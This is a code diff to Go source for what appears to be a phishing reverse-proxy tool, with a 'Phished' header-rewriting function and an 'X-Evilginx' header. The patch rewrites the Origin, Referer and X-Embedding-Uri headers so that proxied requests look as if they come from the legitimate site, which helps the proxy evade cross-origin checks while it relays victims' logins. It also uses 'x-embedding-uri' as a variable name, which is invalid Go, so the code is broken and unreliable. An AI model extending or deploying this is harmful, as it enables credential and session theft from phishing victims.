@@ -612,7 +612,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// fix origin
-				p.replaceHeaderWithOriginal(req, "Origin")
+				origin := req.Header.Get("Origin")
+				if origin != "" {
+					if o_url, err := url.Parse(origin); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("Origin", o_url.String())
+						}
+					}
+				}
 
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
@@ -625,8 +633,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// fix x-embedding-uri
+				x-embedding-uri := req.Header.Get("X-Embedding-Uri")
+				if x-embedding-uri != "" {
+					if o_url, err := url.Parse(x-embedding-uri); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("X-Embedding-Uri", o_url.String())
+						}
+					}
+				}
+
 				// fix referer
-				p.replaceHeaderWithOriginal(req, "Referer")
+				referer := req.Header.Get("Referer")
+				if referer != "" {
+					if o_url, err := url.Parse(referer); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("Referer", o_url.String())
+						}
+					}
+				}
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -905,8 +932,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			trigger := 0
-/*
-			var rm_headers = []string{
+
+/*			var rm_headers = []string{
 				"X-Permitted-Cross-Domain-Policies",
 				"X-Evilginx",
 				"Cross-Origin-Opener-Policy",
@@ -935,8 +962,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
 			}
-*/
-/*                      adapt response headers */
+
+			adapt response headers */
 			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
 			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
 			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
